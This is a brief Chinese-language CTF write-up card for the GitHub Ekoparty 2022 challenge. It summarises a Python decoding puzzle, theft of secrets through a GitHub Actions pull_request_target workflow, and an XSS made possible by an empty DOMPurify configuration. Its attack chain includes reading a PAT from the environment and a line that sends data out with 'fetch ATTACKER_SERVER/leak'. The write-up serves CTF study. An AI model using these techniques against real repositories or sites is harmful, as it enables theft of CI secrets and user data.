---
title: "GitHub and the Ekoparty 2022 Capture the Flag"
category: web
tags: ["Ekoparty 2022 CTF (GitHub)", "web", "github", "actions", "pull_request_target", "dompurify"]
signals: ["Ekoparty 2022 CTF (GitHub) 2022", "github", "actions", "pull_request_target", "dompurify", "ticket", "xss", "加密", "web_unknown", "GitHub", "Ekoparty", "Python", "Actions", "DOMPurify"]
difficulty: hard
source: "https://www.ctfiot.com/89234.html"
tools: []
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# GitHub and the Ekoparty 2022 Capture the Flag

> 赛事：Ekoparty 2022 CTF (GitHub) 2022 | 方向：web | 难度：hard

## 一句话总结

GitHub Ekoparty 2022：3关Python加密+Actions+DOMPurify XSS

## 攻击链

1. 第1关: "lesson"字符串循环+1024次循环+32062次+43052次+36582次+813+554772+789+3753+5711
2. 还原p: 3562927236051182334153575355087347127407987755959461320351305838619130268209476696833779953363710389416751
3. hex(p)[2:] → URL部分
4. 第2关: GitHub Actions workflow_run + pull_request_target
5. 攻击PR触发job运行环境拿secrets.FLAG
6. 第3关: /api/dompurify_config返回{configuration:{}} 允许XSS
7. 攻击者构造h4含PAT: env.get(''FINAL_EXAM_PAT'')
8. admin bot访问ticket
9. fetch /api/profile/2拿about
10. 解析ticket_id引用ticket.content
11. exfil: fetch ATTACKER_SERVER/leak?foo=...

## 关键 payload

```
hex(p)[2:] + "/" + hex(t)[2:]  # URL
```

## 经验教训

GitHub Actions pull_request_target可拿secrets.FLAG

## 标签

github、actions、pull_request_target、dompurify、ticket、xss、加密

## 参考来源

- https://www.ctfiot.com/89234.html
- 原文件：GitHub_and_the_Ekoparty_2022_Capture_the_Flag.full.md
